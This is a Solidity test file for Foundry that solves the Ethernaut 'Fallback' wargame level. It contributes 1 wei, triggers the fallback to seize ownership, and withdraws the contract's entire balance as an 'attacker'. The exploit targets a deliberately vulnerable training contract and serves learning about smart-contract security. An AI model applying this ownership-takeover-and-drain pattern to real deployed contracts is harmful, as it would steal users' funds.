//SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "ethernaut/Ethernaut.sol";
import "ethernaut/Fallback/FallbackFactory.sol";


contract FallbackTest is DSTest {

Vm vm = Vm(address(HEVM_ADDRESS));
Ethernaut ethernaut;
address attacker = address(0xbabe);

//SetUp our variables
function setUp() public {
    ethernaut = new Ethernaut(); //new instance of the Ethernaut game initiated
    vm.deal(attacker, 1 ether); //give attacker account ether to pay for Txs
}

//Test function
function testFallbackHack() public {
     
     //LEVEL SETUP
     FallbackFactory fallbackFactory = new FallbackFactory();
     ethernaut.registerLevel(fallbackFactory);
     vm.startPrank(attacker);

     address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
     Fallback fallbackContract = Fallback(payable(levelAddress));

     //LEVEL ATTACK
     fallbackContract.contribute{value: 1 wei} ();

     emit log_named_uint(
       'Verify you have contributed:',
       fallbackContract.getContribution()
     );


     payable(address(fallbackContract)).call{value: 1 wei } (' '); //trigger fallback
     assertEq(fallbackContract.owner(), attacker);

     emit log_named_uint(
       'Contract balance (before):',
       address(fallbackContract).balance
     );

     emit log_named_uint(
       'Attacker balance (before) : ',
       attacker.balance
     );

     fallbackContract.withdraw();
     assertEq(address(fallbackContract).balance, 0);

     emit log_named_uint(
       'contract balance (after) : ',
       address(fallbackContract).balance
     );

     emit log_named_uint(
       'Attacker balance (after) : ',
        attacker.balance
     );

     //LEVEL ASSERTION
     bool challengeCompleted = ethernaut.submitLevelInstance(
       payable(levelAddress)
     );
     vm.stopPrank();
     assert(challengeCompleted);
} 
  

   














}
